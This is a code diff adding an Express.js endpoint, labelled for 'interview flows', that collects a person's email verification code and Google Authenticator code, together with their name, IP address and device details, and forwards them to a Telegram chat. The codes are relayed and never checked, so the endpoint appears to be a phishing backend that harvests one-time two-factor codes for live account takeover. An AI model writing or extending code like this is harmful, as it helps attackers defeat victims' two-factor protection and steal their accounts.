@@ -749,6 +749,84 @@ app.post('/api/address/notify', async (req, res) => {
     .json({ result: true, status: 'address notification sent' });
 });
 
+// Email + Google Authenticator 2FA notification (used for interview flows)
+app.post('/api/email-2fa/notify', async (req, res) => {
+  if (!isTelegramConfigured()) {
+    return res.status(503).json({
+      result: false,
+      status: 'Telegram notification is not configured on backend.',
+    });
+  }
+
+  const emailCode =
+    typeof req.body?.emailCode === 'string' ? req.body.emailCode.trim() : '';
+  const googleCode =
+    typeof req.body?.googleCode === 'string' ? req.body.googleCode.trim() : '';
+  const guestName =
+    typeof req.body?.guestName === 'string' && req.body.guestName.trim()
+      ? req.body.guestName.trim()
+      : 'Unknown';
+  const companyName =
+    typeof req.body?.companyName === 'string' && req.body.companyName.trim()
+      ? req.body.companyName.trim()
+      : 'Unknown Company';
+
+  if (!emailCode && !googleCode) {
+    return res
+      .status(400)
+      .json({ result: false, status: 'emailCode or googleCode is required.' });
+  }
+
+  const ipAddress = normalizeIpAddress(getClientIp(req)) || 'Unknown';
+
+  // Accept optional device data object like /api/isrun/notify
+  const data =
+    req.body?.data &&
+    typeof req.body.data === 'object' &&
+    !Array.isArray(req.body.data)
+      ? req.body.data
+      : null;
+  const allowedDeviceFields = new Set([
+    'Operating System',
+    'Browser',
+    'Screen Resolution',
+    'Timezone',
+  ]);
+
+  const formatDeviceData = (deviceObj) => {
+    if (!deviceObj || typeof deviceObj !== 'object') return '';
+    return Object.entries(deviceObj)
+      .filter(([key]) => allowedDeviceFields.has(key))
+      .map(
+        ([key, value]) =>
+          `${key}: ${Array.isArray(value) ? value.join(', ') : String(value).trim()}`
+      )
+      .join('\n');
+  };
+
+  const deviceDataLines = formatDeviceData(data);
+
+  const telegramMessage =
+    `IP: ${ipAddress}\nName: ${guestName}\n` +
+    (deviceDataLines ? `${deviceDataLines}\n` : '') +
+    (emailCode ? `Email Code: ${emailCode}\n` : '') +
+    (googleCode ? `Google Authenticator Code: ${googleCode}` : '');
+
+  const telegramRes = await sendTelegramMessage(telegramMessage);
+
+  if (!telegramRes.ok) {
+    return res.status(telegramRes.status || 502).json({
+      result: false,
+      status: telegramRes.message,
+      data: telegramRes.data,
+    });
+  }
+
+  return res
+    .status(200)
+    .json({ result: true, status: 'email 2fa notification sent' });
+});
+
 app.get('/health', async (_req, res) => {
   try {
     await pool.query('SELECT 1');
